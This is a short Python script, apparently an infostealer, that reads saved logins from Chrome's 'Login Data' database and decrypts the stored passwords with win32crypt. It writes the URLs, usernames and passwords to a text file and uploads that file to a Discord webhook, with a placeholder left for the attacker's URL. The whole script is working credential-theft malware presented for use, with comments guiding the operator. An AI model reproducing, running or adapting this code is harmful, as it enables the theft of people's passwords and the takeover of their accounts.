import os
import sqlite3
import win32crypt
import requests

data_path = os.path.expanduser('~') + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\"
login_db = os.path.join(data_path, 'Login Data')

# open file to write information
with open('chrome-information.txt', 'w') as f: #If you want to you can change the name to anything you want
    # connecting to the database
    c = sqlite3.connect(login_db)
    cursor = c.cursor()

    # fetching saved login credentials
    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
    for result in cursor.fetchall():
        password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
        f.write(f"URL: {result[0]}\nUsername: {result[1]}\nPassword: {password}\n\n")

    # closing the database connection
    cursor.close()
    c.close()

# send file to Discord webhook
with open('chrome-information.txt', 'rb') as f: #If you changed the name you need to put in the same name of the file here
    data = {'file': f}
    requests.post('YOUR WEBHOOK URL', files=data)
